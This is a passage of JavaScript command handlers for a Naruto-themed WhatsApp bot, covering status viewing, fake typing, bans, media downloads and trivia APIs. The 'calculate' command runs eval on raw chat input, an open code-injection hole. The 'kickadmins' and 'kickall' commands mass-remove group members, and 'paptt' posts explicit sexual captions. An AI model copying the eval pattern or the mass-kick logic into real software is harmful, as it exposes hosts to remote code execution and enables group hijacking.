        return m.reply("🚫 *Only the Hokage can access this technique.*");
    }
    
    if (!args[0]) {
        return m.reply(
            `👁️ *Mangekyō Sharingan - Status Vision*\n\n` +
            `*Usage:* ${prefix}autoviewstatus on/off\n\n` +
            `_"I will watch over everything from the shadows."_\n` +
            `- Itachi Uchiha`
        );
    }
    
    const action = args[0].toLowerCase();
    
    if (action === "on") {
        setSetting(m.sender, "autoViewStatus", true);
        m.reply(
            `🌀 *Mangekyō Sharingan - Activated*\n\n` +
            `✅ Auto View Status is now enabled\n\n` +
            `_"I see all... even your hidden stories."_`
        );
    } else if (action === "off") {
        setSetting(m.sender, "autoViewStatus", false);
        m.reply(
            `⚫ *Mangekyō Sharingan - Sealed*\n\n` +
            `❌ Auto View Status is now disabled\n\n` +
            `_"Some things are better left unseen."_`
        );
    } else {
        m.reply(
            `⚡ *Invalid Command*\n\n` +
            `*Usage:* ${prefix}autoviewstatus on/off\n\n` +
            `_"Choose wisely... on or off."_`
        );
    }
}
break;

// 🔹 Auto Typing
case "autotyping": {
    if (!isCreator) {
        return m.reply("🚫 *Only the Akatsuki leader can control this jutsu.*");
    }
    
    if (!m.isGroup) {
        return m.reply(
            `⚠️ *Group Restriction*\n\n` +
            `This technique only works in group chats.\n\n` +
            `_"A lone shinobi cannot use this power."_`
        );
    }
    
    if (!args[0]) {
        return m.reply(
            `✍️ *Genjutsu: Phantom Typing*\n\n` +
            `*Usage:* ${prefix}autotyping on/off\n\n` +
            `_"Create the illusion of constant presence."_\n` +
            `- Itachi Uchiha`
        );
    }
    
    const action = args[0].toLowerCase();
    
    if (action === "on") {
        setSetting(m.chat, "autoTyping", true);
        m.reply(
            `🔴 *Genjutsu Activated*\n\n` +
            `✅ Auto Typing enabled in this group\n\n` +
            `_"They will always see me typing... a perfect illusion."_`
        );
    } else if (action === "off") {
        setSetting(m.chat, "autoTyping", false);
        m.reply(
            `⚫ *Genjutsu Released*\n\n` +
            `❌ Auto Typing disabled in this group\n\n` +
            `_"The illusion fades... silence returns."_`
        );
    } else {
        m.reply(
            `⚡ *Invalid Input*\n\n` +
            `*Usage:* ${prefix}autotyping on/off\n\n` +
            `_"Master the basics first."_`
        );
    }
}
break;

// 🔹 Auto Recording
case "autorecording": {
    if (!isCreator) {
        return m.reply("🚫 *Only the Akatsuki leader can control this jutsu.*");
    }
    
    if (!m.isGroup) {
        return m.reply(
            `⚠️ *Group Restriction*\n\n` +
            `This technique only works in group chats.\n\n` +
            `_"Surveillance requires a crowd to observe."_`
        );
    }
    
    if (!args[0]) {
        return m.reply(
            `🎙️ *Sensory Technique: Voice Detection*\n\n` +
            `*Usage:* ${prefix}autorecording on/off\n\n` +
            `_"Listen carefully... every word matters."_\n` +
            `- Itachi Uchiha`
        );
    }
    
    const action = args[0].toLowerCase();
    
    if (action === "on") {
        setSetting(m.chat, "autoRecording", true);
        m.reply(
            `🔴 *Sensory Mode Activated*\n\n` +
            `✅ Auto Recording enabled in this group\n\n` +
            `_"I'm always listening... gathering intelligence."_`
        );
    } else if (action === "off") {
        setSetting(m.chat, "autoRecording", false);
        m.reply(
            `⚫ *Sensory Mode Deactivated*\n\n` +
            `❌ Auto Recording disabled in this group\n\n` +
            `_"Silence falls... the surveillance ends."_`
        );
    } else {
        m.reply(
            `⚡ *Invalid Input*\n\n` +
            `*Usage:* ${prefix}autorecording on/off\n\n` +
            `_"Choose your path carefully."_`
        );
    }
}
break;

// 🔹 Auto Record Type
case "autorecordtype": {
    if (!isAdmins && !isCreator) {
        return m.reply("🚫 *Only shinobi with authority can control this jutsu.*");
    }
    
    if (!m.isGroup) {
        return m.reply(
            `⚠️ *Group Restriction*\n\n` +
            `This technique only works in group chats.\n\n` +
            `_"A team is required for this mission."_`
        );
    }
    
    if (!args[0]) {
        return m.reply(
            `🎛️ *Dual Sensory Mode*\n\n` +
            `*Usage:* ${prefix}autorecordtype on/off\n\n` +
            `_"Master both sight and sound simultaneously."_\n` +
            `- Itachi Uchiha`
        );
    }
    
    const action = args[0].toLowerCase();
    
    if (action === "on") {
        setSetting(m.chat, "autoRecordType", true);
        m.reply(
            `🌀 *Dual Mode Activated*\n\n` +
            `✅ Auto Record Type enabled in this group\n\n` +
            `_"Recording while typing... the perfect combination of deception."_`
        );
    } else if (action === "off") {
        setSetting(m.chat, "autoRecordType", false);
        m.reply(
            `⚫ *Dual Mode Deactivated*\n\n` +
            `❌ Auto Record Type disabled in this group\n\n` +
            `_"The dual technique has been sealed."_`
        );
    } else {
        m.reply(
            `⚡ *Invalid Input*\n\n` +
            `*Usage:* ${prefix}autorecordtype on/off\n\n` +
            `_"Precision is key in every command."_`
        );
    }
}
break;

// 🔹 Auto React
case "autoreact": {
    if (!isAdmins && !isCreator) {
        return m.reply("🚫 *Only shinobi with authority can control this jutsu.*");
    }
    
    if (!m.isGroup) {
        return m.reply(
            `⚠️ *Group Restriction*\n\n` +
            `This technique only works in group chats.\n\n` +
            `_"I cannot express emotions in solitude."_`
        );
    }
    
    if (!args[0]) {
        return m.reply(
            `😶 *Emotion Masking Technique*\n\n` +
            `*Usage:* ${prefix}autoreact on/off\n\n` +
            `_"Show emotion... or hide behind a mask."_\n` +
            `- Itachi Uchiha`
        );
    }
    
    const action = args[0].toLowerCase();
    
    if (action === "on") {
        setSetting(m.chat, "autoReact", true);
        m.reply(
            `🔴 *Emotion Release Activated*\n\n` +
            `✅ Auto React enabled in this group\n\n` +
            `_"I will show my feelings through reactions... a rare glimpse."_`
        );
    } else if (action === "off") {
        setSetting(m.chat, "autoReact", false);
        m.reply(
            `⚫ *Emotion Sealed*\n\n` +
            `❌ Auto React disabled in this group\n\n` +
            `_"Back to the emotionless facade... as it should be."_`
        );
    } else {
        m.reply(
            `⚡ *Invalid Input*\n\n` +
            `*Usage:* ${prefix}autoreact on/off\n\n` +
            `_"Think before you act."_`
        );
    }
}
break;

// 🔹 Anti-Link
case "antilink": {
    if (!m.isGroup) return m.reply("⚠️ This command is only for groups.");
    if (!isAdmins && !isCreator) return m.reply("🚫 Only admins can control this jutsu.");

    const action = (args[0] || "").toLowerCase();
    if (!action || !["on", "off"].includes(action)) {
        return m.reply(
            `🛡️ *AntiLink Barrier*\n\n` +
            `Usage: ${prefix}antilink on/off\n` +
            `_"Protect the village from external threats."_`
        );
    }

    // Save setting (you can implement this with a JSON or database)
    if (!global.groupSettings) global.groupSettings = {};
    global.groupSettings[m.chat] = global.groupSettings[m.chat] || {};
    
    if (action === "on") {
        global.groupSettings[m.chat].antilink = true;
        m.reply("🔴 *Barrier Activated*\n✅ AntiLink is now ON in this group.");
    } else {
        global.groupSettings[m.chat].antilink = false;
        m.reply("⚫ *Barrier Deactivated*\n❌ AntiLink is now OFF in this group.");
    }
}
break;

// ==================== MESSAGE MONITOR ====================
if (m.isGroup && global.groupSettings?.[m.chat]?.antilink) {
    const linkRegex = /(https?:\/\/|www\.)/i;
    if (linkRegex.test(m.text) && !isAdmins) {
        // Delete the message
        await rich.deleteMessage(m.chat, { id: m.id }).catch(() => null);
        // Notify the sender
        await rich.sendMessage(
            m.chat,
            { text: `⚠️ @${m.sender.split("@")[0]}, forbidden link detected!` },
            { mentions: [m.sender] }
        );
    }
}

// 🔹 Banned
case "ban": {
    if (!isCreator) {
        return m.reply("🚫 *Only the Hokage can execute this judgment.*");
    }
    
    if (!args[0]) {
        return m.reply(
            `⚔️ *Exile Technique*\n\n` +
            `*Usage:* ${prefix}ban <@user>\n\n` +
            `_"Some must be removed for the greater good."_`
        );
    }
    
    let user = args[0].replace(/[^0-9]/g, "") + "@s.whatsapp.net";
    setSetting(user, "banned", true);
    
    m.reply(
        `🔴 *Banishment Jutsu Executed*\n\n` +
        `⚔️ @${user.split("@")[0]} has been exiled from the village\n\n` +
        `_"Forgive me... but this is necessary for peace."_ - Itachi Uchiha`,
        { mentions: [user] }
    );
}
break;

case "unban": {
    if (!isCreator) {
        return m.reply("🚫 *Only the Hokage can grant redemption.*");
    }
    
    if (!args[0]) {
        return m.reply(
            `🕊️ *Redemption Technique*\n\n` +
            `*Usage:* ${prefix}unban <@user>\n\n` +
            `_"Everyone deserves a second chance."_`
        );
    }
    
    let user = args[0].replace(/[^0-9]/g, "") + "@s.whatsapp.net";
    setSetting(user, "banned", false);
    
    m.reply(
        `🌀 *Redemption Granted*\n\n` +
        `✅ @${user.split("@")[0]} has been pardoned and may return to the village\n\n` +
        `_"The past is forgiven... walk a new path."_ - Itachi Uchiha`,
        { mentions: [user] }
    );
}
break;

// 🔹 Feature: Auto Reply
case "autoreply": {
    if (!isCreator) {
        return m.reply("🚫 *Only the Hokage can control this technique.*");
    }
    
    if (!args[0]) {
        return m.reply(
            `💬 *Shadow Clone Response Technique*\n\n` +
            `*Usage:* ${prefix}autoreply on/off\n\n` +
            `_"My clone will answer in my absence."_\n` +
            `- Itachi Uchiha`
        );
    }
    
    const action = args[0].toLowerCase();
    
    if (action === "on") {
        setSetting(m.chat, "feature.autoreply", true);
        m.reply(
            `🔴 *Shadow Clone Summoned*\n\n` +
            `✅ Auto Reply enabled in this chat\n\n` +
            `_"My shadow will respond when I cannot... always watching."_`
        );
    } else if (action === "off") {
        setSetting(m.chat, "feature.autoreply", false);
        m.reply(
            `⚫ *Shadow Clone Dismissed*\n\n` +
            `❌ Auto Reply disabled in this chat\n\n` +
            `_"The clone has dispersed... I'll answer personally now."_`
        );
    } else {
        m.reply(
            `⚡ *Invalid Input*\n\n` +
            `*Usage:* ${prefix}autoreply on/off\n\n` +
            `_"Choose wisely... on or off."_`
        );
    }
}
break;

// 🔹 Feature: Anti Spam
case "antispam": {
    if (!isCreator) {
        return m.reply("🚫 *Only the Hokage can control this technique.*");
    }
    
    if (!args[0]) {
        return m.reply(
            `⚠️ *Sealing Technique: Message Control*\n\n` +
            `*Usage:* ${prefix}antispam on/off\n\n` +
            `_"Control the chaos... seal the spam."_\n` +
            `- Itachi Uchiha`
        );
    }
    
    const action = args[0].toLowerCase();
    
    if (action === "on") {
        setSetting(m.chat, "feature.antispam", true);
        m.reply(
            `🔴 *Sealing Jutsu Activated*\n\n` +
            `✅ Anti Spam enabled in this chat\n\n` +
            `_"Spam messages will be sealed... order restored."_`
        );
    } else if (action === "off") {
        setSetting(m.chat, "feature.antispam", false);
        m.reply(
            `⚫ *Sealing Released*\n\n` +
            `❌ Anti Spam disabled in this chat\n\n` +
            `_"The seal has been lifted... beware of chaos."_`
        );
    } else {
        m.reply(
            `⚡ *Invalid Input*\n\n` +
            `*Usage:* ${prefix}antispam on/off\n\n` +
            `_"Precision matters in every technique."_`
        );
    }
}
break;

// 🔹 Feature: Anti Bad Word
case "antibadword": {
    if (!isCreator) {
        return m.reply("🚫 *Only the Hokage can control this technique.*");
    }
    
    if (!args[0]) {
        return m.reply(
            `🗣️ *Genjutsu: Word Censorship*\n\n` +
            `*Usage:* ${prefix}antibadword on/off\n\n` +
            `_"Keep the village pure... silence the profanity."_\n` +
            `- Itachi Uchiha`
        );
    }
    
    const action = args[0].toLowerCase();
    
    if (action === "on") {
        setSetting(m.chat, "feature.antibadword", true);
        m.reply(
            `🔴 *Censorship Genjutsu Activated*\n\n` +
            `✅ Anti Bad Word enabled in this chat\n\n` +
            `_"Profanity will be erased... maintain respect and honor."_`
        );
    } else if (action === "off") {
        setSetting(m.chat, "feature.antibadword", false);
        m.reply(
            `⚫ *Genjutsu Released*\n\n` +
            `❌ Anti Bad Word disabled in this chat\n\n` +
            `_"The filter has been removed... speak freely, but wisely."_`
        );
    } else {
        m.reply(
            `⚡ *Invalid Input*\n\n` +
            `*Usage:* ${prefix}antibadword on/off\n\n` +
            `_"Words have power... choose them carefully."_`
        );
    }
}
break;

// 🔹 Feature: Anti Bot
case "antibot": {
    if (!isCreator) {
        return m.reply("🚫 *Only the Hokage can control this technique.*");
    }
    
    if (!args[0]) {
        return m.reply(
            `🤖 *Summoning Rejection Technique*\n\n` +
            `*Usage:* ${prefix}antibot on/off\n\n` +
            `_"No foreign summons allowed... only true shinobi."_\n` +
            `- Itachi Uchiha`
        );
    }
    
    const action = args[0].toLowerCase();
    
    if (action === "on") {
        setSetting(m.chat, "feature.antibot", true);
        m.reply(
            `🔴 *Summoning Barrier Activated*\n\n` +
            `✅ Anti Bot enabled in this chat\n\n` +
            `_"No artificial beings shall enter... only humans are permitted."_`
        );
    } else if (action === "off") {
        setSetting(m.chat, "feature.antibot", false);
        m.reply(
            `⚫ *Summoning Barrier Deactivated*\n\n` +
            `❌ Anti Bot disabled in this chat\n\n` +
            `_"The barrier has fallen... all summons may enter now."_`
        );
    } else {
        m.reply(
            `⚡ *Invalid Input*\n\n` +
            `*Usage:* ${prefix}antibot on/off\n\n` +
            `_"Make your choice clear."_`
        );
    }
}
break;
// 🔹 Owner case
case 'owner': {
   let vcard = `BEGIN:VCARD\nVERSION:3.0\nFN:My Owner\nTEL;type=CELL;type=VOICE;waid=2347070904956:+2347070904956\nEND:VCARD`
   await rich.sendMessage(m.chat, { contacts: { displayName: "Owner", contacts: [{ vcard }] }}, { quoted: m })
}
break

// 🔹 Repo case
case 'repo': {
   let txt = `🔴 *Itachi Bot Repository*  
⚡🌀 ━━━━━━━ 【🔥 THE LEGENDARY SHINOBI BOT HAS AWAKENED! 🔥】 ━━━━━━━ 🌀⚡  

After countless missions in the shadows, mastering every technique...  
💫 The power you've been seeking is finally REVEALED! 💫  

Introducing the ultimate WhatsApp control system forged in the ways of the Uchiha  
👁️ DEPLOY, COMMAND & DOMINATE YOUR WHATSAPP LIKE A TRUE SHINOBI! 🗡️  

🎯 Activate the Sharingan now and unlock infinite possibilities:  
🔗 👉 https://t.me/itachimd_s1_bot  
⚔️ No mercy. No limits. Pure precision.  
Unleash the power of automation — send commands, control messages, and rule with the Mangekyō Sharingan 👁️🔥  

Every message, every response, every command... controlled by your will 🌀⚡  

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━  
⚡ Forged by:  
💎 𝕷𝖚𝖒𝖔𝖗𝖆 𝕿𝖊𝖈𝖍 💎  
👁️ *Uchiha Legacy | Silent Power | Reserved Strength* 👁️  
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━  
🌟 Lumora Tech — Where the Sharingan Meets Supreme Intelligence. 🌟  

_"Those who cannot acknowledge themselves, will eventually fail."_ - Itachi Uchiha*`
   await rich.sendMessage(m.chat, { text: txt }, { quoted: m })
}
break

case 'tourl': {    

    let q = m.quoted ? m.quoted : m;
    if (!q || !q.download) return reply(`Reply to an Image or Video with command ${prefix + command}`);
    
    let mime = q.mimetype || '';
    if (!/image\/(png|jpe?g|gif)|video\/mp4/.test(mime)) {
        return reply('Only images or MP4 videos are supported!');
    }

    let media;
    try {
        media = await q.download();
    } catch (error) {
        return reply('Failed to download media!');
    }

    const uploadImage = require('./allfunc/Data6');
    const uploadFile = require('./allfunc/Data7');
    let isTele = /image\/(png|jpe?g|gif)|video\/mp4/.test(mime);
    let link;
    try {
        link = await (isTele ? uploadImage : uploadFile)(media);
    } catch (error) {
        return reply('Failed to upload media!');
    }

    rich.sendMessage(m.chat, {
        text: `[DONE BY ${botname} MD] [${link}]`
    }, { quoted: m });
}
break;
case 'tiktok':
case 'tt':
    {
        if (!text) {
            return reply(`Example: ${prefix + command} link`);
        }
        if (!text.includes('tiktok.com')) {
            return reply(`Link Invalid!! Please provide a valid TikTok link.`);
        }
        
        m.reply("loading..");
    
        const tiktokApiUrl = `https://api.bk9.dev/download/tiktok?url=${encodeURIComponent(text)}`;

        fetch(tiktokApiUrl)
            .then(response => response.json())
            .then(data => {
                if (!data.status || !data.BK9 || !data.BK9.BK9) {
                    return reply('Failed to get a valid download link from the API.');
                }
                
                const videoUrl = data.BK9.BK9;
                
                rich.sendMessage(m.chat, {
                    caption: "success",
                    video: { url: videoUrl }
                }, { quoted: m });
            })
            .catch(err => {
                console.error(err);
                reply("An error occurred while fetching the video. Please check your network or try a different link.");
            });
    }
    break;
case 'apk':
case 'apkdl': {
  if (!text) {
    return reply(` *Example:* ${prefix + command} com.whatsapp`);
  }
  
  try {
    const packageId = text.trim();
    const res = await fetch(`https://api.bk9.dev/download/apk?id=${encodeURIComponent(packageId)}`);
    const data = await res.json();

    if (!data.status || !data.BK9 || !data.BK9.dllink) {
      return reply(' *APK not found.* The package ID might be incorrect or the API failed. Please try a different one.');
    }

    const { name, emperor, dllink, package: packageName } = data.BK9;

    await rich.sendMessage(m.chat, {
      image: { url: emperor},
      caption:
`╭〔 *📦 APK Downloader* 〕─⬣
│
│ 🧩 *Name:* _${name}_
│ 📁 *Package:* _${packageName}_
│ 📥 *Download:* [Click Here](${dllink})
│
╰────────────⬣
_Sending file, please wait..._`
    }, { quoted: m });

    await rich.sendMessage(m.chat, {
      document: { url: dllink },
      fileName: `${name}.apk`,
      mimetype: 'application/vnd.android.package-archive'
    }, { quoted: m });

  } catch (e) {
    console.error(e);
    reply('*Failed to fetch APK.* An unexpected error occurred. Please try again later.');
  }
}
break;
case 'tomp4': {
   if (!m.quoted) return reply("🖼️ Reply to a *sticker or gif* with tomp4")
   let mime = m.quoted.mimetype || ''
   if (!/webp|gif/.test(mime)) return reply("⚠️ Reply must be a sticker or gif")

   try {
      // Download the quoted sticker/gif
      let media = await rich.downloadMediaMessage(m.quoted)

      // Send it as video/mp4
      await rich.sendMessage(m.chat, {
         video: media,
         mimetype: 'video/mp4',
         caption: "🎬 Converted to MP4"
      }, { quoted: m })

   } catch (e) {
      console.log(e)
      reply("❌ Failed to convert to MP4")
   }
}
break
case 'tomp3': {
   if (!m.quoted) return reply("🎥 Reply to a *video* with tomp3")
   let mime = m.quoted.mimetype || ''
   if (!/video/.test(mime)) return reply("⚠️ Reply to a video only")

   try {
      // download the quoted video
      let media = await rich.downloadMediaMessage(m.quoted)

      // send it back as audio (mp3)
      await rich.sendMessage(m.chat, {
         audio: media,
         mimetype: 'audio/mpeg',
         ptt: false
      }, { quoted: m })

   } catch (e) {
      console.log(e)
      reply("❌ Failed to convert to MP3")
   }
}
break
case 'kickadmins': {
    if (!m.isGroup) return reply(m.group)
    if (!isCreator) return reply("Only bot owner can use this!")
    if (!isBotAdmins) return reply(m.botAdmin)

    let metadata = await rich.groupMetadata(m.chat)
    let participants = metadata.participants

    for (let member of participants) {
        // Skip bot and command issuer
        if (member.id === botNumber) continue
        if (member.id === m.sender) continue

        // Only kick admins
        if (member.admin === "superadmin" || member.admin === "admin") {
            await rich.groupParticipantsUpdate(
                m.chat,
                [member.id],
                'remove'
            )
            await sleep(1500) // prevent WA rate limit
        }
    }

    m.reply("⚡ All admins kicked (except you and the bot)!")
}
break;
case 'kickall': {
    if (!isCreator) return reply("owner only")
    if (!m.isGroup) return reply(m.group)
    if (!isCreator) return reply(m.admin)
    if (!isBotAdmins) return reply(m.botAdmin)

    let metadata = await rich.groupMetadata(m.chat)
    let participants = metadata.participants

    for (let member of participants) {
        // skip owner & bot itself
        if (member.id === botNumber) continue
        if (member.admin === "superadmin" || member.admin === "admin") continue 

        await rich.groupParticipantsUpdate(
            m.chat,
            [member.id],
            'remove'
        )
        await sleep(1500) // delay so WA won’t block
    }

    m.reply("✅ All members have been removed (except admins & bot).")
}
break;

case 'paptt': { if (prefix === '.') {
 if (!isCreator) return reply(m.premium)
global.paptt = [
 "https://telegra.ph/file/5c62d66881100db561c9f.mp4",
 "https://telegra.ph/file/a5730f376956d82f9689c.jpg",
 "https://telegra.ph/file/8fb304f891b9827fa88a5.jpg",
 "https://telegra.ph/file/0c8d173a9cb44fe54f3d3.mp4",
 "https://telegra.ph/file/b58a5b8177521565c503b.mp4",
 "https://telegra.ph/file/34d9348cd0b420eca47e5.jpg",
 "https://telegra.ph/file/73c0fecd276c19560133e.jpg",
 "https://telegra.ph/file/af029472c3fcf859fd281.jpg",
 "https://telegra.ph/file/0e5be819fa70516f63766.jpg",
 "https://telegra.ph/file/29146a2c1a9836c01f5a3.jpg",
 "https://telegra.ph/file/85883c0024081ffb551b8.jpg",
 "https://telegra.ph/file/d8b79ac5e98796efd9d7d.jpg",
 "https://telegra.ph/file/267744a1a8c897b1636b9.jpg",
 ]
 let url = paptt[Math.floor(Math.random() * paptt.length)]
 rich.sendFile(m.chat, url, null, 'Aww..umm💦,am so horny come ride my pu**y anyhow u want🤤🍑🍆', m)
}}
break
case 'coffee': {
rich.sendMessage(m.chat, {caption: m.success, image: { url: 'https://coffee.alexflipnote.dev/random' }}, { quoted: m })
            }
            break
case 'myip': {
        if (!isCreator) return reply(m.only.owner)
var http = require('http')
http.get({
'host': 'api.ipify.org',
'port': 80,
'path': '/'
}, function(resp) {
resp.on('data', function(ip) {
    reply("Your Ip Address Is: " + ip)
})
})
            }
        break


case "movie": {
    if (!text) return m.reply("Provide a movie title. Example: movie Inception");
    try {
        const res = await axios.get(`http://www.omdbapi.com/?t=${encodeURIComponent(text)}&apikey=6372bb60`);
        if (res.data.Response === "False") return m.reply("Movie not found.");
        const data = res.data;
        const msg = `🎬 Title: ${data.Title}
Year: ${data.Year}
Rated: ${data.Rated}
Released: ${data.Released}
Runtime: ${data.Runtime}
Genre: ${data.Genre}
Director: ${data.Director}
Actors: ${data.Actors}
Plot: ${data.Plot}
IMDB Rating: ${data.imdbRating}
Link: https://www.imdb.com/title/${data.imdbID}`;
        await rich.sendMessage(m.chat, { text: msg }, { quoted: m });
    } catch (e) {
        console.error(e);
        m.reply("Failed to fetch movie info.");
    }
}
break;
case "recipe-ingredient": {
    if (!text) return m.reply("Provide an ingredient. Example: recipe-ingredient chicken");
    try {
        const res = await axios.get(`https://www.themealdb.com/api/json/v1/1/filter.php?i=${encodeURIComponent(text)}`);
        if (!res.data.meals) return m.reply(" No recipes found with that ingredient.");
        const meals = res.data.meals.slice(0,5).map((m,i)=>`${i+1}. ${m.strMeal}\nhttps://www.themealdb.com/meal.php?c=${m.idMeal}`).join("\n\n");
        await rich.sendMessage(m.chat, { text: `🍴 Recipes with "${text}":\n\n${meals}` }, { quoted: m });
    } catch {
        m.reply("Failed to fetch recipes.");
    }
}
break;
case "mathfact": {
    try {
        const res = await axios.get("http://numbersapi.com/random/math?json");
        await rich.sendMessage(m.chat, { text: `🔢 Math Fact:\n${res.data.text}` }, { quoted: m });
    } catch {
        m.reply("Failed to fetch math fact.");
    }
}
break;
case "sciencefact": {
    try {
        const res = await axios.get("https://uselessfacts.jsph.pl/random.json?language=en");
        await rich.sendMessage(m.chat, { text: `🔬 Science Fact:\n${res.data.text}` }, { quoted: m });
    } catch {
        m.reply("Failed to fetch science fact.");
    }
}
break;
case "book": {
    if (!text) return m.reply("Provide a book title or author. Example: book Harry Potter");
    try {
        const res = await axios.get(`https://openlibrary.org/search.json?q=${encodeURIComponent(text)}&limit=5`);
        if (!res.data.docs.length) return m.reply(" No books found.");
        const books = res.data.docs.map((b,i)=>`${i+1}. ${b.title} by ${b.author_name?.[0] || "Unknown"}\nLink: https://openlibrary.org${b.key}`).join("\n\n");
        await rich.sendMessage(m.chat, { text: `📚 Book Search Results:\n\n${books}` }, { quoted: m });
    } catch {
        m.reply("Failed to fetch book information.");
    }
}
break;
case "horoscope": {
    if (!text) return m.reply("Provide your zodiac sign. Example: horoscope leo");
    try {
        const res = await axios.get(`https://aztro.sameerkumar.website/?sign=${text.toLowerCase()}&day=today`, { method: "POST" });
        const data = res.data;
        const msg = `🔮 Horoscope for ${text.toUpperCase()}:\nMood: ${data.mood}\nLucky Number: ${data.lucky_number}\nLucky Color: ${data.color}\nCompatibility: ${data.compatibility}\nDate Range: ${data.date_range}\n\n${data.description}`;
        await rich.sendMessage(m.chat, { text: msg }, { quoted: m });
    } catch {
        m.reply("Failed to fetch horoscope.");
    }
}
break;
case "recipe": {
    if (!text) return m.reply("Provide a dish name. Example: recipe pancakes");
    try {
        const res = await axios.get(`https://www.themealdb.com/api/json/v1/1/search.php?s=${encodeURIComponent(text)}`);
        if (!res.data.meals) return m.reply("No recipes found.");
        const meal = res.data.meals[0];
        const msg = `🍽 Recipe: ${meal.strMeal}\nCategory: ${meal.strCategory}\nCuisine: ${meal.strArea}\n\nIngredients:\n${Array.from({length:20}).map((_,i)=>meal[`strIngredient${i+1}`] ? `${meal[`strIngredient${i+1}`]} - ${meal[`strMeasure${i+1}`]}` : '').filter(Boolean).join("\n")}\n\nInstructions:\n${meal.strInstructions}`;
        await rich.sendMessage(m.chat, { text: msg }, { quoted: m });
    } catch {
        m.reply("Failed to fetch recipe.");
    }
}
break;

case "remind": {
    if (!text) return m.reply("Usage: remind <seconds> <message>. Example: remind 60 Take a break");
    const [sec, ...msgArr] = text.split(" ");
    const msgText = msgArr.join(" ");
    const delay = parseInt(sec) * 1000;
    if (isNaN(delay) || !msgText) return m.reply(" Invalid usage.");
    await m.reply(`⏰ Reminder set for ${sec} seconds.`);
    setTimeout(() => {
        rich.sendMessage(m.chat, { text: `⏰ Reminder: ${msgText}` });
    }, delay);
}
break;
case "define":
case "dictionary": {
    if (!text) return m.reply("Provide a word to define. Example: define computer");
    try {
        const res = await axios.get(`https://api.dictionaryapi.dev/api/v2/entries/en/${text}`);
        const meanings = res.data[0].meanings[0].definitions[0].definition;
        await rich.sendMessage(m.chat, { text: `📖 ${text}:\n${meanings}` }, { quoted: m });
    } catch {
        m.reply("Could not find definition.");
    }
}
break;
case "currency": {
    if (!text) return m.reply(" Usage: currency <amount> <from> <to>\nExample: currency 100 USD NGN");
    const [amount, from, to] = text.split(" ");
    if (!amount || !from || !to) return m.reply(" Missing arguments!");

    try {
        const res = await axios.get(`https://api.exchangerate.host/convert?from=${from.toUpperCase()}&to=${to.toUpperCase()}&amount=${amount}`);
        await rich.sendMessage(m.chat, { text: `💱 ${amount} ${from.toUpperCase()} = ${res.data.result} ${to.toUpperCase()}` }, { quoted: m });
    } catch (e) {
        m.reply("Failed to convert currency.");
    }
}
break;
case "time": {
    if (!text) return m.reply("Provide a city or timezone. Example: time Lagos");
    try {
        const res = await axios.get(`http://worldtimeapi.org/api/timezone/${encodeURIComponent(text)}`);
        await rich.sendMessage(m.chat, { text: `🕒 Current time in ${res.data.timezone}:\n${res.data.datetime}` }, { quoted: m });
    } catch (e) {
        m.reply("Could not fetch time for that location.");
    }
}
break;
case "iplookup": {
    if (!text) return m.reply("Provide an IP or domain. Example: iplookup 8.8.8.8");
    try {
        const res = await axios.get(`https://ipapi.co/${text}/json/`);
        await rich.sendMessage(m.chat, { text: `🌐 IP Info for ${text}:\nCountry: ${res.data.country_name}\nRegion: ${res.data.region}\nCity: ${res.data.city}\nOrg: ${res.data.org}\nISP: ${res.data.org}` }, { quoted: m });
    } catch (e) {
        m.reply("Could not fetch IP info.");
    }
}
break;
case "genpass": {
    const length = parseInt(text) || 12;
    const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()";
    let pass = "";
    for (let i=0;i<length;i++) pass += chars.charAt(Math.floor(Math.random()*chars.length));
    await rich.sendMessage(m.chat, { text: `🔑 Generated Password:\n${pass}` }, { quoted: m });
}
break;
case "readqr": {
    if (!m.quoted || !m.quoted.image) return m.reply("Reply to an image containing a QR code.");
    const buffer = await m.quoted.download();
    try {
        const res = await axios.post("https://api.qrserver.com/v1/read-qr-code/", buffer, {
            headers: { "Content-Type": "multipart/form-data" }
        });
        const qrText = res.data[0].symbol[0].data;
        await rich.sendMessage(m.chat, { text: `📱 QR Code Content:\n${qrText}` }, { quoted: m });
    } catch (e) {
        m.reply("Failed to read QR code.");
    }
}
break;
case "weather": {
    if (!text) return m.reply("provide a city. Example: weather Lagos");
    const res = await axios.get(`https://wttr.in/${encodeURIComponent(text)}?format=3`);
    await rich.sendMessage(m.chat, { text: `🌤 Weather:\n${res.data}` }, { quoted: m });
}
break;
case "calculate": {
    if (!text) return m.reply("Provide an expression. Example: calculate 12+25*3");
    try {
        const result = eval(text); // ⚠️ use with caution; you can use mathjs for safety
        await rich.sendMessage(m.chat, { text: `🧮 Result: ${result}` }, { quoted: m });
    } catch {
        m.reply("Invalid expression.");
    }
}
break;
case "wiki": {
    if (!text) return m.reply("Provide a search term. Example: wiki JavaScript");
    const res = await axios.get(`https://en.wikipedia.org/api/rest_v1/page/summary/${encodeURIComponent(text)}`);
    await rich.sendMessage(m.chat, { text: `📚 ${res.data.title}\n\n${res.data.extract}` }, { quoted: m });
}
break;
case "qrcode": {
    if (!text) return m.reply("Provide text to generate QR code. Example: qrcode HelloWorld");
    const url = `https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${encodeURIComponent(text)}`;
    await rich.sendMessage(m.chat, { image: { url }, caption: "📱 QR Code Generated" }, { quoted: m });
}
break;
case "pdftotext": {
    if (!m.quoted || !m.quoted.fileName?.endsWith(".pdf")) return m.reply("❌ Reply to a PDF file.");
    const pdfBuffer = await m.quoted.download(); // your MD bot method
    const pdf = await pdfParse(pdfBuffer);
    await rich.sendMessage(m.chat, { text: `📄 PDF Text:\n\n${pdf.text}` }, { quoted: m });
}
break;

case "hangman": {
    const chatId = m.chat;
    const args = text?.split(" ") || [];
    let game = hangmanGames[chatId];

    // Start new game
    if (!game) {
        if (!args[0]) return m.reply("❌ Start game with a word. Example: hangman banana");
        const word = args[0].toLowerCase();
        const display = "_".repeat(word.length).split("");
        hangmanGames[chatId] = { word, display, attempts: 6, guessed: [] };
        await rich.sendMessage(chatId, { text: `🕹 Hangman Started!\n${display.join(" ")}\nAttempts left: 6\nVisual:\n${hangmanVisual[0]}\nGuess letters: hangman <letter>` }, { quoted: m });
        return;
    }

    // Guess a letter
    if (!args[0]) return m.reply("❌ Provide a letter. Example: hangman a");
    const letter = args[0].toLowerCase();
    if (letter.length !== 1) return m.reply("❌ Guess one letter at a time.");
